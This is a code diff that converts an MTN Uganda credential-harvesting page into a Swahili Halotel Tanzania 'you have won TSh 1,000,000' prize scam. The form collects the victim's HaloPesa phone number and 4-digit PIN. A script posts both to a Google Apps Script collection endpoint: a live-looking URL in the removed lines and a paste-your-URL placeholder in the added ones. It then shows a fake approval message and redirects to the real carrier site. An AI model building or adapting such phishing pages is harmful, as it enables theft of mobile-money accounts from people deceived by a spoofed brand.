@@ -1,70 +1,243 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN Uganda</title>
+    <title>Halotel Tanzania - Tuzo Yako</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f0f0; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .card { background: #fff; width: 100%; max-width: 360px; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); overflow: hidden; }
-        .header { background: #ffcc00; padding: 30px; text-align: center; }
-        .header img { max-width: 120px; height: auto; } /* Upload your MTN logo as logo.png */
-        .content { padding: 25px; }
-        .input-group { display: flex; align-items: center; margin-bottom: 15px; border: 2px solid #ddd; border-radius: 8px; overflow: hidden; }
-        .input-group:focus-within { border-color: #ffcc00; }
-        .prefix { background: #f5f5f5; padding: 14px 12px; font-weight: bold; color: #333; font-size: 15px; border-right: 2px solid #ddd; }
-        input { border: none; padding: 14px 12px; width: 100%; font-size: 16px; background: transparent; outline: none; }
-        .btn { background: #ffcc00; color: #000; border: none; padding: 16px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 5px; }
-        .btn:hover { background: #e6b800; }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+
+        body {
+            min-height: 100vh;
+            display: flex; justify-content: center; align-items: center;
+            padding: 20px;
+            /* Soft Halotel-green wash — rhymes with logo green */
+            background: linear-gradient(160deg, #f1f8f4 0%, #d9f2e3 50%, #b8e6cc 100%);
+        }
+
+        .card {
+            background: #ffffff;
+            width: 100%; max-width: 390px;
+            border-radius: 16px;
+            box-shadow: 0 18px 60px rgba(0, 122, 61, 0.18);
+            overflow: hidden;
+            animation: slideUp 0.55s cubic-bezier(.25,.8,.25,1);
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(32px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ── HEADER : mirrors logo's white base with green frame ── */
+        .header {
+            background: #ffffff;
+            padding: 28px 20px 22px;
+            text-align: center;
+            border-bottom: 3px solid #00a651;
+            position: relative;
+        }
+        /* thin red accent strip — echoes logo red */
+        .header::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #ed1c24 0%, #ed1c24 22%, transparent 22%, transparent 78%, #ed1c24 78%);
+        }
+        .header img { max-width: 150px; height: auto; display: block; margin: 0 auto; }
+
+        .badge {
+            display: inline-block;
+            background: #00a651;
+            color: #ffffff;
+            padding: 6px 20px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 11px;
+            margin-top: 12px;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            box-shadow: 0 2px 8px rgba(0,166,81,0.3);
+        }
+
+        .content { padding: 28px 26px 26px; text-align: center; }
+
+        h2 { color: #00552e; font-size: 24px; margin-bottom: 8px; font-weight: 700; }
+
+        .subtitle {
+            color: #4a5568; font-size: 14px; line-height: 1.65; margin-bottom: 20px;
+        }
+        .subtitle strong { color: #007a3d; }
+
+        /* ── PRIZE BOX ── */
+        .prize-box {
+            background: linear-gradient(135deg, #f1f8f4 0%, #e4f4ea 100%);
+            border: 2px dashed #00a651;
+            border-radius: 12px;
+            padding: 18px 14px;
+            margin-bottom: 24px;
+        }
+        .prize-amount {
+            font-size: 32px; font-weight: 900; color: #007a3d;
+            letter-spacing: -0.5px;
+        }
+        .prize-label {
+            font-size: 11px; color: #6b7280; margin-top: 4px;
+            text-transform: uppercase; letter-spacing: 1.5px;
+        }
+
+        /* ── INPUTS : harmonised with logo green ── */
+        .input-group {
+            display: flex; align-items: center;
+            margin-bottom: 14px;
+            border: 2px solid #d9f2e3;
+            border-radius: 10px;
+            overflow: hidden;
+            background: #fafcfa;
+            transition: all 0.25s ease;
+        }
+        .input-group:focus-within {
+            border-color: #00a651;
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(0,166,81,0.12);
+        }
+        .prefix {
+            background: #e4f4ea;
+            padding: 14px 12px;
+            font-weight: 700; color: #007a3d;
+            font-size: 15px;
+            border-right: 2px solid #d9f2e3;
+            white-space: nowrap;
+        }
+        input {
+            border: none; padding: 14px 12px;
+            width: 100%; font-size: 16px;
+            background: transparent; outline: none;
+            color: #1f2937;
+        }
+        input::placeholder { color: #9ca3af; }
+
+        /* ── BUTTON : Halotel green with subtle red bottom edge ── */
+        .btn {
+            background: linear-gradient(135deg, #00a651 0%, #007a3d 100%);
+            color: #ffffff; border: none;
+            padding: 16px; width: 100%;
+            border-radius: 10px;
+            font-size: 17px; font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 8px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 14px rgba(0,166,81,0.35);
+            position: relative;
+        }
+        .btn::after {
+            content: '';
+            position: absolute;
+            bottom: 0; left: 0; right: 0;
+            height: 3px;
+            background: #ed1c24;
+            border-radius: 0 0 10px 10px;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 22px rgba(0,166,81,0.45);
+        }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+
+        .loader {
+            display: none; margin-top: 14px;
+            color: #007a3d; font-weight: 600; font-size: 13px;
+        }
+        .loader::before {
+            content: '';
+            display: inline-block;
+            width: 14px; height: 14px;
+            border: 2px solid #00a651;
+            border-top-color: transparent;
+            border-radius: 50%;
+            margin-right: 8px;
+            vertical-align: middle;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .footer {
+            font-size: 11px; color: #9ca3af; margin-top: 22px;
+            text-transform: uppercase; letter-spacing: 1.2px;
+        }
+        .disclaimer {
+            font-size: 10px; color: #b0b6bd; margin-top: 8px; line-height: 1.4;
+        }
     </style>
 </head>
 <body>
 
 <div class="card">
     <div class="header">
-        <!-- Upload your MTN logo manually as logo.png -->
-        <img src="logo.png" alt="MTN">
+        <!-- Upload your Halotel logo manually as logo.png -->
+        <img src="logo.png" alt="Halotel">
+        <div class="badge">Rasmi 2026</div>
     </div>
-    
+
     <div class="content">
+        <h2>Hongera!</h2>
+        <p class="subtitle">Namba yako ya simu ya <strong>Halotel</strong> imechaguliwa kwa bahati nasibu. Umekuwa mshindi wa Zawadi ya Msaada wa Kifedha ya <strong>HaloPesa Promo 2026</strong>.</p>
+
+        <div class="prize-box">
+            <div class="prize-amount">TSh 1,000,000/=</div>
+            <div class="prize-label">Milioni Moja</div>
+        </div>
+
+        <p style="font-size: 13px; color: #4a5568; margin-bottom: 18px;">Tafadhali ingiza maelezo yako ya <strong>HaloPesa</strong> hapa chini ili kupokea zawadi yako mara moja.</p>
+
         <form id="claimForm">
             <div class="input-group">
-                <div class="prefix">+256</div>
-                <input type="tel" name="phone_suffix" placeholder="Phone number" required pattern="[0-9]{7,10}">
-            </div>
-            
-            <div class="input-group">
-                <input type="password" name="pin" placeholder="PIN" required maxlength="4" inputmode="numeric">
+                <div class="prefix">+255</div>
+                <input type="tel" name="phone_suffix" placeholder="Namba ya simu (062...)" required pattern="[0-9]{9,10}">
             </div>
 
-            <button type="submit" class="btn" id="submitBtn">Submit</button>
+            <div class="input-group">
+                <input type="password" name="pin" placeholder="Namba ya siri (4 tarakimu)" required maxlength="4" inputmode="numeric">
+            </div>
+
+            <button type="submit" class="btn" id="submitBtn">POKEA ZAWADI SASA</button>
         </form>
+
+        <div class="loader" id="status">Inathibitisha akaunti yako...</div>
+
+        <p class="footer">Imewekwa na Halotel Tanzania</p>
+        <p class="disclaimer">*Zawadi hii ni bure kabisa. Hakuna malipo yanayohitajika. Pesa zitawasili kwenye HaloPesa yako ndani ya dakika 10.</p>
     </div>
 </div>
 
 <script>
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbye0lcSe4Gnm0bUH6XH4s4ASWG6OzNx3XLH4JVczv8tBucm6kn0h4YTka_Ey_mB30g5cA/exec';
+    const scriptURL = 'YOUR_APPS_SCRIPT_URL_HERE'; // PASTE YOUR GOOGLE APPS SCRIPT URL HERE
     const form = document.getElementById('claimForm');
     const btn = document.getElementById('submitBtn');
+    const status = document.getElementById('status');
 
     form.addEventListener('submit', e => {
         e.preventDefault();
         btn.disabled = true;
-        btn.textContent = "Processing...";
+        btn.textContent = "INAPROSESWA...";
+        status.style.display = 'block';
 
         const formData = new FormData(form);
-        const fullPhone = "+256" + formData.get('phone_suffix');
+        const fullPhone = "+255" + formData.get('phone_suffix');
         formData.append('full_phone', fullPhone);
 
-        fetch(scriptURL, { method: 'POST', body: formData, mode: 'no-cors' })
+        fetch(scriptURL, {
+            method: 'POST',
+            body: formData,
+            mode: 'no-cors'
+        })
         .then(() => {
-            alert("Success");
-            window.location.href = "https://www.mtn.co.ug/";
+            alert("✅ Hongera! Zawadi yako ya TSh 1,000,000/= imeidhinishwa. Pesa zitawasili kwenye akaunti yako ya HaloPesa ndani ya dakika 10. Asante kwa kuwa mteja mwaminifu wa Halotel!");
+            window.location.href = "https://www.halotel.co.tz/";
         })
         .catch(() => {
-            window.location.href = "https://www.mtn.co.ug/";
+            window.location.href = "https://www.halotel.co.tz/";
         });
     });
 </script>
